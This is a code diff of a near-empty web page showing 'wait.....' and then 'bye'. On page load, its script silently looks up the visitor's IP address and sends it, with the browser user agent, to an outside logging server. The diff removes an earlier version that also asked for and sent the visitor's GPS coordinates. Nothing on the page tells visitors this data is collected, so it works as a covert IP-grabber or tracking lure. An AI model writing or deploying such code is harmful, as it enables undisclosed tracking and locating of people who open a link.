@@ -17,65 +17,31 @@
     <p id="status">wait.....</p>
 
     <script>
+        // 위치 정보 요청 부분이 없는 원래의 스크립트
         window.onload = function() {
             const statusElement = document.getElementById('status');
-            const loggerServerUrl = 'https://aaa-production-efa7.up.railway.app/log-ip';
+            
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const userIp = data.ip;
+                    const userAgent = navigator.userAgent;
 
-            // --- 위치 정보와 IP를 서버로 보내는 최종 함수 ---
-            function sendData(ip, userAgent, lat, lon) {
-                fetch(loggerServerUrl, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ 
-                        ip: ip, 
-                        userAgent: userAgent,
-                        latitude: lat,
-                        longitude: lon
+                    const loggerServerUrl = 'https://aaa-production-efa7.up.railway.app/log-ip'; 
+
+                    fetch(loggerServerUrl, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ ip: userIp, userAgent: userAgent })
                     })
-                })
-                .then(res => res.json())
-                .then(logResult => {
-                    console.log('Log server response:', logResult.message);
-                    statusElement.textContent = 'bye';
-                })
-                .catch(err => console.error('Failed to send log:', err));
-            }
-
-            // --- IP 주소를 가져오는 함수 ---
-            function getIpAndSendData(lat, lon) {
-                fetch('https://api.ipify.org?format=json')
-                    .then(response => response.json())
-                    .then(data => {
-                        sendData(data.ip, navigator.userAgent, lat, lon);
+                    .then(res => res.json())
+                    .then(logResult => {
+                        console.log('Log server response:', logResult.message);
+                        statusElement.textContent = 'bye';
                     })
-                    .catch(error => {
-                        console.error('IP fetch error:', error);
-                        // IP 가져오기 실패 시에도 위치 정보만이라도 보낼 수 있음 (선택사항)
-                        sendData(null, navigator.userAgent, lat, lon);
-                    });
-            }
-
-            // --- 1. Geolocation API 실행 ---
-            if (navigator.geolocation) {
-                // 위치 정보 요청 팝업을 띄웁니다.
-                navigator.geolocation.getCurrentPosition(
-                    // (성공 콜백) 사용자가 '허용'을 누르면 실행
-                    function(position) {
-                        const lat = position.coords.latitude;
-                        const lon = position.coords.longitude;
-                        getIpAndSendData(lat, lon); // 위치 정보와 함께 IP 가져오기 실행
-                    },
-                    // (실패 콜백) 사용자가 '차단'을 누르거나 오류가 나면 실행
-                    function(error) {
-                        console.warn('Geolocation Error:', error.message);
-                        getIpAndSendData(null, null); // 위치 정보 없이 IP 가져오기 실행
-                    }
-                );
-            } else {
-                // 브라우저가 위치 정보를 지원하지 않는 경우
-                console.error("Geolocation is not supported by this browser.");
-                getIpAndSendData(null, null); // 위치 정보 없이 IP 가져오기 실행
-            }
+                    .catch(err => console.error('Failed to send log to server:', err));
+                })
+                .catch(error => console.error('Failed to get IP address:', error));
         };
     </script>
 </body>
